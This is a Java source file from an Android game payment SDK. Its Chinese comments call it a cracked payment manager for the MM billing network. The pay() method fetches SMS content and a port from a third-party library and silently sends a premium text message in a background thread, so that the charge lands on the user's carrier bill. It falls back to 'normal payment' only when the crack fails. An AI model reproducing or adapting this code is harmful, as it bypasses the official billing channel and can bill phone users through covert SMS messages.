package mobi.zty.pay.sdk.leyouFee;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.Util_G;

import org.apache.commons.logging.Log;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.iap.youshu.IAPMTKPayment;
import com.iap.youshu.PaymentInfo;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class LeYouFeeInstance extends PaymentInterf{
	public boolean initSUCC = true;
	private static LeYouFeeInstance instance;
	private Handler callBHandler = null;
	private Context context;
	public static LeYouFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized LeYouFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new LeYouFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
		String channelId = (String) parameters[0];
		callBHandler = (Handler) parameters[1];
		try {
			PaymentInfo.Init(context, channelId);
			initSUCC = true;
		} catch (Exception e) {
			initSUCC = false;
			e.printStackTrace();
		}
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		if (!initSUCC) {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.FEE_FAIL_TO_OTHER;
			info.retMsg = "leyou初始化失败";
			Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
			message.obj = info;
			message.sendToTarget();
			return;
		}
		final String appID = (String) parameters[0];
		final String payCode = (String) parameters[1];
		final String channelId = (String) parameters[2];
		final String exData = (String) parameters[3];
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Looper.prepare();
						IAPMTKPayment payment = IAPMTKPayment.doMTK102OpertionRequest
								(payCode,exData,appID,channelId,PaymentInfo.getTelecom());
						if (payment.getResult() == 0||payment.getResult() == 1) {
							callBHandler.removeMessages(PayConfig.NATIVE_FEE_FAIL);
							callBHandler.sendEmptyMessageDelayed(PayConfig.NATIVE_FEE_FAIL, 20000);
							Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
					        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
					        GameSDK.getInstance().bCallback = 0; 
					        if(!sendSms(mSendPI, payment)){
					        	sendMsgFail();
					        };
//					        payment.sendSms(mSendPI, null);
						}else{
							PayResultInfo info = new PayResultInfo();
							info.resutCode = PayConfig.FEE_FAIL_TO_OTHER;
							info.retMsg = "破解失败转正常支付";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
				    	
					} catch (Exception e) {
						sendMsgFail();
						e.printStackTrace();
					}
				}

				
			}).start();;
		
	}
	private void sendMsgFail() {
		PayResultInfo info = new PayResultInfo();
		info.resutCode = PayConfig.FEE_FAIL_TO_OTHER;
		info.retMsg = "破解失败转正常支付";
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	public boolean sendSms(PendingIntent sendIntent,IAPMTKPayment payment)
	{
		try
		{
			String sms_data = payment.getSms_data();
			if (sms_data!=null){
				Util_G.sendTextMessage(context, payment.getSms_port(), sms_data, sendIntent, 0);
			}else {
				byte[] sms_bin = payment.getSms_bin();
				if (sms_bin!=null){
					Util_G.sendTextMessage(context, payment.getSms_port(), "", sendIntent, 2,sms_bin);
				}else{
					return false;
				}
			}
		   return true;
		}
		catch( Exception e )
		{
			sendMsgFail();
	    	Util_G.debugE(com.iap.youshu.PaymentInfo.TAG,"IAPMTKPayment::sendSms exception: "+e.getMessage());
			return false;
		}
	}
}
